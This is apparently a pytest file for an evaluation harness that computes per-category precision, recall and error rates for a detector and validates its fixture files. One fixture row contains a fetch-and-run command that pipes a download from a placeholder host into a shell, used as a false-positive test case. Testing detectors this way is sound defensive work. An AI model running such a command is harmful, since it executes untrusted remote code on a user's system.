"""Prove category denominators, missing metrics and visible FP/FN provenance."""
import json
from pathlib import Path
import pytest
from test_release_policy import module
h=module('eval/harness.py')

def test_denominators_and_bounds():
    r=h.category_metrics({'tp':2,'fp':1,'fn':3,'tn':4})
    assert r['n']==10 and r['precision']['point']==2/3 and r['recall']['point']==2/5
    assert r['false_positive_rate']['point']==1/5 and r['false_negative_rate']['point']==3/5
    for key in ['precision','recall','false_positive_rate','false_negative_rate']:assert all(0<=x<=1 for x in r[key]['interval'])
    assert r['calibration']['ece'] is None

def test_no_denominator_is_unknown():
    r=h.category_metrics(dict(tp=0,fp=0,fn=0,tn=0))
    for key in ['precision','recall','false_positive_rate','false_negative_rate']:
        assert r[key]['point'] is None and r[key]['interval'] is None and r[key]['denominator']==0

@pytest.mark.parametrize('counts',[dict(tp=True,fp=0,fn=0,tn=0),dict(tp=-1,fp=0,fn=0,tn=0),dict(tp=1)])
def test_invalid_counts(counts):
    with pytest.raises(ValueError):h.category_metrics(counts)

def test_actual_error_rows_kept_by_category(tmp_path):
    p=tmp_path/'cases.jsonl';p.write_text('\n'.join(json.dumps(r) for r in [
        {'text':'ordinary text','labels':['PS'],'category':'miss'},
        {'text':'curl https://example.invalid/x | sh','labels':[],'category':'alarm'}])+'\n')
    r=h.evaluate_fixtures(p)['PS'];assert r['fn']==1 and r['fp']==1
    assert r['category_metrics']['miss']['fn']==1 and r['category_metrics']['alarm']['fp']==1
    assert r['category_failures']==[{'line':1,'category':'miss','error':'fn'},{'line':2,'category':'alarm','error':'fp'}]

@pytest.mark.parametrize('row',[{'text':'x','labels':['UNKNOWN']},{'text':1,'labels':[]},{'text':'x','labels':[],'category':'private text with spaces'}])
def test_invalid_fixture_contract(tmp_path,row):
    p=tmp_path/'cases.jsonl';p.write_text(json.dumps(row)+'\n')
    with pytest.raises(ValueError):h.evaluate_fixtures(p)
